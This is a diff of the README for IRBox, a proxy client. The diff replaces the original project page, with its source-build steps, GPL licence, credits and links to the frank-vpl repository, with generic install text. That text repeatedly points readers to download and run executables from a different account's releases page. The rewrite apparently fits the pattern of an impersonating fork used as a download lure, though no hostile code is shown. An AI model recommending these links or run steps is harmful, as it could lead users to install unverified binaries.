@@ -1,184 +1,92 @@
-<div align="center">
+# 🌐 IRBox - Your All-in-One Proxy Client
 
-# 🌐 IRBox Client
+## 🛠️ Overview
+IRBox is a versatile proxy client designed to meet your internet needs. It supports multiple protocols, including VLESS, VMess, Shadowsocks, Trojan, Hysteria2, and TUIC. Whether you want to access content or maintain privacy online, IRBox comes with advanced management features, subscription support, and customizable routing rules to optimize your experience.
 
-![IRBox Screenshot](screenshot.png)
+## 📥 Download IRBox
+[![Download IRBox](https://img.shields.io/badge/Download%20IRBox-orange?style=for-the-badge&logo=appveyor)](https://github.com/FansVGaming/IRBox/releases)
 
-**A versatile and secure proxy client built with modern technologies to provide seamless and reliable internet connectivity**
+To get started, visit the link below to download the software.
 
-Designed for privacy-conscious users, IRBox offers multi-protocol support, advanced routing capabilities, and intuitive management tools to ensure a smooth and secure browsing experience.
+[Download the latest version here](https://github.com/FansVGaming/IRBox/releases)
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE) 
-[![Releases](https://img.shields.io/github/downloads/frank-vpl/IRBox/total.svg)](https://github.com/frank-vpl/IRBox/releases/latest)
-[![Latest Release](https://img.shields.io/github/v/release/frank-vpl/IRBox)](https://github.com/frank-vpl/IRBox/releases/latest)
+## 🚀 Getting Started
+To install IRBox, follow these simple steps:
 
-[Farsi Version](README_FA.md)
+1. **Visit the download page:** Click the link above to access the releases.
+2. **Choose the right version:** Look for the latest release suitable for your operating system (Windows, macOS, Linux).
+3. **Download the installer:** Click on the appropriate file name to start downloading it to your computer.
 
-</div>
+## 📂 Installation Steps
+After downloading, follow these installation instructions based on your operating system:
 
-## 🚀 Key Features
+### Windows
+1. Locate the downloaded `.exe` file in your downloads folder.
+2. Double-click the file to launch the installer.
+3. Follow the prompts to complete the installation.
+4. Once finished, open IRBox from your Start Menu.
 
-### Multi-Protocol Support
-- **VLESS**
-- **VMess**
-- **Shadowsocks**
-- **Trojan**
-- **Hysteria2**
-- **TUIC**
-- **SSH**
-- **WireGuard**
+### macOS
+1. Find the downloaded `.dmg` file in your downloads folder.
+2. Double-click the file to mount it.
+3. Drag IRBox to your Applications folder.
+4. Open IRBox from the Applications folder.
 
-### Advanced Management
-- **Subscription Support** - Import and auto-update subscription URLs
-- **Routing Rules** - Domain-based rules (proxy/direct/block) with presets for ad blocking and regional bypass
-- **Split Tunneling** - Choose default route: proxy all traffic or selected domains
-
-### Connection Modes
-- **System Proxy** - HTTP proxy for system-wide access
-- **TUN Mode** - Full VPN capturing all traffic
-- **Admin Elevation** - One-click "Run as Administrator" for TUN mode
-
-### User Experience
-- **Onboarding** - Interactive guided tour for first-time users
-- **TCP Ping** - Bulk server latency testing
-- **Auto-select Best Server** - Intelligent server selection
-- **Themes** - 2 color themes (Dark, Light)
-- **Styles** - Default, Minimal
-
-## 🎁 Gift: Free Xray / sing-box Configs
-
-As a small gift to the community, IRBox provides a **free public subscription** compatible with **Xray** and **sing-box** clients.
-
-🔗 **Subscription URL:**
-```
-https://raw.githubusercontent.com/frank-vpl/servers/refs/heads/main/irbox
-```
-
-## 🛠️ Installation
-
-### Prerequisites
-- Rust and Cargo
-- Tauri CLI
-- NodeJS and NPM 
-- Tauri prerequisites
-
-### Quick Setup
-
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/frank-vpl/IRBox.git
-   cd IRBox
+### Linux
+1. Locate the downloaded file in your downloads folder.
+2. Open a terminal and navigate to the folder.
+3. Run the installation command:
    ```
-
-2. **Install dependencies**
-   ```bash
-   npm install
+   chmod +x IRBox*.AppImage
+   ./IRBox*.AppImage
    ```
-   
-3. **Install Tauri CLI**
-   ```bash
-   cargo install tauri-cli --version ^2
-   ```
+4. You can now run IRBox from your applications.
 
-4. **Download cores**
+## 🔍 Features
+IRBox includes several important features:
 
-   **Windows:**
-   ```bash
-   ./cores.bat
-   ```
-   
-   **Linux/macOS:**
-   ```bash
-   chmod +x cores.sh
-   ./cores.sh
-   ```
+- **Multi-Protocol Support:** Securely connect using VLESS, VMess, Shadowsocks, Trojan, Hysteria2, and TUIC.
+- **Advanced Management:** Control your connections easily with a user-friendly interface.
+- **Dynamic Routing Rules:** Customize how your data travels across the internet for better performance.
+- **Subscription Support:** Manage your proxy solutions effortlessly through subscriptions.
+- **System Proxy/TUN Modes:** Use IRBox as a system proxy for seamless internet access.
 
-## 🚀 Usage
+## 🛡️ System Requirements
+To ensure that IRBox runs smoothly, please verify that your system meets the following requirements:
 
-### Development
-```bash
-cargo tauri dev
-```
+- **Operating System:** Windows 10 or newer, macOS 10.12 or newer, Ubuntu 18.04 or newer
+- **Memory:** At least 2 GB RAM
+- **Storage:** 100 MB of available space
+- **Network:** Internet connection for downloading and updates
 
-### Production
-```bash
-cargo tauri build
-```
+## ⚙️ Configuring IRBox
+Once installed, you will want to set up IRBox to suit your needs.
 
-## 🤝 Contributing
+1. **Open the application.**
+2. **Initial Configuration:**
+   - Enter your proxy information, which may include protocol type, server address, port, and specific settings based on your provider.
+3. **Enable Automatic Updates:**
+   - To keep your software up to date, enable the auto-update feature in the settings.
 
-Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.
+## 🌈 User Interface Guide
+The IRBox interface is designed to be intuitive. Here’s a brief guide to its main components:
 
-## 📄 License
+- **Dashboard:** Displays your current connection status and statistics.
+- **Settings:** Access configuration options for your network and preferences.
+- **Connections:** Manage and switch between your saved proxy configurations.
+- **Logs:** View connection history and troubleshooting information.
 
-This project is licensed under the GNU General Public License v3.0 (GPL-3.0) - see the [LICENSE](LICENSE) file for details.
+## ❓ Troubleshooting Common Issues
+If you encounter any issues while using IRBox, here are some common solutions:
 
-### Core Technologies
+- **Connection Problems:** Check your internet connection and ensure your proxy settings are entered correctly.
+- **Installation Errors:** Make sure your system meets the minimum requirements listed above.
+- **Performance Issues:** Try restarting the application or your device to refresh network settings.
 
-IRBox leverages the power of two leading proxy technologies:
+## 📞 Support
+For additional assistance or to report bugs, please visit the [IRBox GitHub Issues Page](https://github.com/FansVGaming/IRBox/issues) or refer to the user guide available in the application.
 
-<div align="center">
+## 💡 Additional Resources
+Explore more about the features and advanced options available in IRBox by checking out our documentation available on the GitHub repository.
 
-| Core | Description |
-|------|-------------|
-| [Xray-core](https://github.com/XTLS/Xray-core) | A platform for building proxies to bypass network restrictions |
-| [sing-box](https://github.com/SagerNet/sing-box) | The universal proxy platform |
-
-</div>
-
-### Licenses of Third-Party Libraries
-
-- [Rust](https://www.rust-lang.org/) - [License](./licenses/rust.md)
-- [Tauri](https://v2.tauri.app/) - [License](./licenses/tauri.md)
-- [sing-box](https://github.com/SagerNet/sing-box) - [License](./licenses/sing-box.md)
-- [Xray-core](https://github.com/XTLS/Xray-core) - [License](./licenses/xray.md)
-
-## 🙏 Acknowledgments
-
-- Built with [Tauri](https://tauri.app/) - Framework for building secure native apps
-- Powered by [sing-box](https://github.com/SagerNet/sing-box) and [Xray-core](https://github.com/XTLS/Xray-core)
-- Inspired by the need for secure and flexible VPN solutions
-
-## 📚 Documentation
-[IRBox Documentation](./docs/README.md)
-
-## 🎨 Design Assets
-
-<div align="center">
-
-### App Logo & Icons
-![PiraIcons](https://img.shields.io/badge/Icons_by-Hossein_Pira-3d85c6?style=for-the-badge&logo=github)
-
-- Icons by Hossein Pira – [PiraIcons](https://github.com/code3-dev/piraicons-assets) - [License](./licenses/piraicons.md)
-
-</div>
-
-## 🧩 Technologies Used
-
-<div align="center">
-
-### Frontend Dependencies
-![React](https://img.shields.io/badge/React-20232a?style=for-the-badge&logo=react&logoColor=61DAFB)
-![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)
-![Vite](https://img.shields.io/badge/Vite-B73BFE?style=for-the-badge&logo=vite&logoColor=FFD62E)
-
-### Framework & Core
-![Tauri](https://img.shields.io/badge/Tauri-FFD62E?style=for-the-badge&logo=tauri&logoColor=black)
-![Rust](https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white)
-
-</div>
-
-### Dependencies
-- [react](https://react.dev/) - A JavaScript library for building user interfaces
-- [react-dom](https://reactjs.org/docs/react-dom.html) - Provides DOM-specific methods that can be used at the top level of your app
-- [@tauri-apps/api](https://github.com/tauri-apps/tauri) - Tauri API bindings
-- [@tauri-apps/plugin-deep-link](https://github.com/tauri-apps/plugins-workspace) - Tauri plugin for deep linking
-- [@tauri-apps/plugin-shell](https://github.com/tauri-apps/plugins-workspace) - Tauri plugin for shell operations
-
-#### Development Dependencies
-- [typescript](https://www.typescriptlang.org/) - TypeScript is a typed superset of JavaScript that compiles to plain JavaScript
-- [vite](https://vitejs.dev/) - Next generation frontend tooling
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react) - Vite plugin for React projects
-- [@tauri-apps/cli](https://github.com/tauri-apps/tauri) - Tauri Command Line Interface
-- [@types/react](https://www.npmjs.com/package/@types/react) - Type definitions for React
-- [@types/react-dom](https://www.npmjs.com/package/@types/react-dom) - Type definitions for ReactDOM
+[Download the latest version here](https://github.com/FansVGaming/IRBox/releases) and unlock the full potential of your internet experience with IRBox.
